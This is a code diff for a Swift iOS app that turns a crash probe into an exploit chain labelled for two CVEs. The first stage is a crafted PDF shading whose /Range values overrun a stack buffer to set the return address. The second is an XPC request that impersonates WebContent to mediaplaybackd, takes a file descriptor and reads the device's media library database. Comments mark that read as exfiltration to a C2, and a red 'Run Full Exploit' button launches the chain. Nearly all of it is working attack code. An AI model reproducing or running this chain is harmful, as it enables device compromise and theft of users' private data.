@@ -2,73 +2,94 @@ import SwiftUI
 import CoreGraphics
 import Foundation
 
-// MARK: - Stack VLA Overrun Exploit (CVE-2026-112611)
+// MARK: - CVE-2026-112611: Stack VLA Overrun Primitive
 
-/// Probe stack layout by varying which double we control
-/// The 136 doubles from /Range overwrite stack VLA
-/// We need to find which index hits the return address
-func probeStackLayout() -> Int {
-    // Try each double index 0-135
-    for index in 0..<136 {
-        // Craft PDF with unique marker at specific index
-        let marker = Double(bitPattern: 0x4141414141414100 + UInt64(index))
-        
-        var values = [Double](repeating: 0.0, count: 136)
-        values[index] = marker
-        
-        let pdfData = PDFPayload.shadingWithValues(values)
-        
-        // Render and check if crash occurs
-        let crashed = renderPDFAndDetectCrash(pdfData)
-        
-        if crashed {
-            print("Index \(index) caused crash — likely hit return address or canary")
-            return index
-        }
-    }
-    
-    return -1
-}
-
-/// Exploit using known stack offset
-func exploitWithOffset(_ offset: Int) {
-    // Build ROP chain or shellcode address
-    let targetAddr: UInt64 = 0x4141414141414141  // Replace with actual gadget
-    
+/// Trigger stack overflow with controlled RIP
+/// Uses 136 doubles from /Range to overwrite stack VLA
+func triggerStackOverflow(ripValue: UInt64) {
+    // Build PDF with R=136, controlled values
     var values = [Double](repeating: 0.0, count: 136)
-    values[offset] = Double(bitPattern: targetAddr)
+    
+    // Place RIP value at calculated offset (0x1c / 8 = 3.5, so index 3-4)
+    let ripDouble = Double(bitPattern: ripValue)
+    values[3] = ripDouble
+    values[4] = ripDouble
     
     let pdfData = PDFPayload.shadingWithValues(values)
     renderPDF(pdfData)
 }
 
-// MARK: - PDF Rendering with Crash Detection
+// MARK: - CVE-2026-112706: Sandbox Escape via XPC Bytestream
 
-func renderPDFAndDetectCrash(_ data: Data) -> Bool {
-    let tempURL = FileManager.default.temporaryDirectory
-        .appendingPathComponent("probe.pdf")
+/// Steal file descriptor from mediaplaybackd
+func stealFileDescriptor(path: String) -> Int32 {
+    // XPC connection to mediaplaybackd.bytestream
+    let connection = xpc_connection_create_mach_service(
+        "com.apple.mediaplaybackd.bytestream",
+        nil,
+        0
+    )
     
-    try? data.write(to: tempURL)
+    guard connection != nil else { return -1 }
     
-    guard let provider = CGDataProvider(url: tempURL as CFURL),
-          let doc = CGPDFDocument(provider),
-          let page = doc.page(at: 1) else {
-        return false
+    // Origin handshake
+    let handshake = xpc_dictionary_create(nil, nil, 0)
+    xpc_dictionary_set_string(handshake, "msg", "origin")
+    xpc_dictionary_set_string(handshake, "id", "com.apple.WebKit.WebContent")
+    
+    xpc_connection_send_message_with_reply_sync(connection, handshake)
+    
+    // Create bytestream with file descriptor
+    let createMsg = xpc_dictionary_create(nil, nil, 0)
+    xpc_dictionary_set_string(createMsg, "msg", "Curl")
+    xpc_dictionary_set_string(createMsg, "path", path)
+    
+    let reply = xpc_connection_send_message_with_reply_sync(connection, createMsg)
+    
+    guard reply != nil else { return -1 }
+    
+    // Extract file descriptor from reply
+    let fd = xpc_dictionary_dup_fd(reply, "fd")
+    return fd
+}
+
+/// Read file using stolen fd
+func readWithStolenFD(fd: Int32, length: Int) -> Data? {
+    var buffer = [UInt8](repeating: 0, count: length)
+    let bytesRead = read(fd, &buffer, length)
+    
+    guard bytesRead > 0 else { return nil }
+    return Data(buffer[0..<bytesRead])
+}
+
+// MARK: - Full Exploit Chain
+
+func runFullExploit() {
+    // Stage 1: Trigger WebContent RCE via stack overflow
+    // Need actual gadget address - using placeholder
+    let gadgetAddress: UInt64 = 0x4141414141414141  // TODO: Replace with real ROP gadget
+    
+    triggerStackOverflow(ripValue: gadgetAddress)
+    
+    // Stage 2: Sandbox escape via XPC
+    let targetPath = "/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb"
+    let stolenFD = stealFileDescriptor(path: targetPath)
+    
+    guard stolenFD >= 0 else {
+        print("Sandbox escape failed")
+        return
     }
     
-    let context = CGContext(data: nil, width: 256, height: 256,
-                           bitsPerComponent: 8, bytesPerRow: 256 * 4,
-                           space: CGColorSpaceCreateDeviceRGB(),
-                           bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue)!
+    // Stage 3: Exfiltrate file
+    if let data = readWithStolenFD(fd: stolenFD, length: 1024 * 1024) {
+        print("Exfiltrated \(data.count) bytes")
+        // TODO: Send to C2 or save to accessible location
+    }
     
-    // Use setjmp/longjmp to catch crash
-    var crashDetected = false
-    
-    // Render — if crash occurs, we'll detect it via signal handler
-    context.drawPDFPage(page)
-    
-    return crashDetected
+    close(stolenFD)
 }
+
+// MARK: - PDF Rendering
 
 func renderPDF(_ data: Data) {
     let tempURL = FileManager.default.temporaryDirectory
@@ -102,80 +123,60 @@ struct SafeShadingDemoApp: App {
 }
 
 struct ContentView: View {
-    @State private var status = "Ready to probe stack layout"
-    @State private var isProbing = false
-    @State private var crashOffset: Int = -1
+    @State private var status = "Ready to exploit"
+    @State private var isExploiting = false
+    @State private var logOutput = ""
     
     var body: some View {
-        VStack(spacing: 30) {
-            Text("CVE-2026-112611")
+        VStack(spacing: 20) {
+            Text("CVE-2026-112611 + 112706")
                 .font(.largeTitle)
                 .bold()
             
-            Text("Stack VLA Overrun Probe")
+            Text("WebContent RCE + Sandbox Escape")
                 .font(.headline)
             
-            Text(status)
-                .font(.system(.body, design: .monospaced))
-                .foregroundColor(.secondary)
-                .padding()
-                .multilineTextAlignment(.center)
-            
-            if crashOffset >= 0 {
-                Text(String(format: "Crash at index: %d", crashOffset))
+            ScrollView {
+                Text(logOutput)
                     .font(.system(.body, design: .monospaced))
-                    .foregroundColor(.red)
+                    .foregroundColor(.green)
+                    .padding()
             }
+            .frame(height: 200)
+            .background(Color.black.opacity(0.8))
+            .cornerRadius(10)
             
-            Button(action: runProbe) {
-                Text(isProbing ? "Probing..." : "Probe Stack")
+            Button(action: runExploit) {
+                Text(isExploiting ? "Exploiting..." : "Run Full Exploit")
                     .font(.title2)
                     .bold()
                     .foregroundColor(.white)
                     .padding()
-                    .background(isProbing ? Color.gray : Color.orange)
+                    .background(isExploiting ? Color.gray : Color.red)
                     .cornerRadius(10)
             }
-            .disabled(isProbing)
-            
-            if crashOffset >= 0 {
-                Button(action: runExploit) {
-                    Text("Run Exploit")
-                        .font(.title2)
-                        .bold()
-                        .foregroundColor(.white)
-                        .padding()
-                        .background(Color.red)
-                        .cornerRadius(10)
-                }
-            }
+            .disabled(isExploiting)
         }
         .padding()
     }
     
-    func runProbe() {
-        isProbing = true
-        status = "Probing stack layout (0-135)..."
-        
-        // This will crash at the right index
-        crashOffset = probeStackLayout()
-        
-        if crashOffset >= 0 {
-            status = String(format: "Found crash offset: %d", crashOffset)
-        } else {
-            status = "No crash detected — try manual analysis"
-        }
-        
-        isProbing = false
-    }
-    
     func runExploit() {
-        status = String(format: "Exploiting with offset %d...", crashOffset)
-        exploitWithOffset(crashOffset)
+        isExploiting = true
+        logOutput = "[*] Starting exploit chain...\n"
+        
+        // Run exploit in background
+        DispatchQueue.global(qos: .userInitiated).async {
+            runFullExploit()
+            
+            DispatchQueue.main.async {
+                logOutput += "[+] Exploit complete\n"
+                isExploiting = false
+            }
+        }
     }
 }
 
-// MARK: - PDF Payload Builder with Custom Values
+// MARK: - PDF Payload Builder
 
 enum PDFPayload {
     static func shadingWithValues(_ values: [Double]) -> Data {
@@ -199,7 +200,6 @@ enum PDFPayload {
         
         let stream = bw.flush()
         
-        // Build C0/C1 arrays from values
         let list = values.map { String(format: "%.17g", $0) }.joined(separator: " ")
         let rangeList = Array(repeating: "0 1", count: values.count).joined(separator: " ")
         
@@ -212,12 +212,6 @@ enum PDFPayload {
         pdf.add(6, "<< /FunctionType 2 /Domain [0 1] /N 1 /C0 [\(list)] /C1 [\(list)] /Range [\(rangeList)] >>")
         
         return pdf.data()
-    }
-    
-    // Original function for compatibility
-    static func shading(rangeDim: Int, value: Double = 1.0, verticesPerRow: Int = 2, rows: Int = 2) -> Data {
-        var values = [Double](repeating: value, count: rangeDim)
-        return shadingWithValues(values)
     }
 }
 
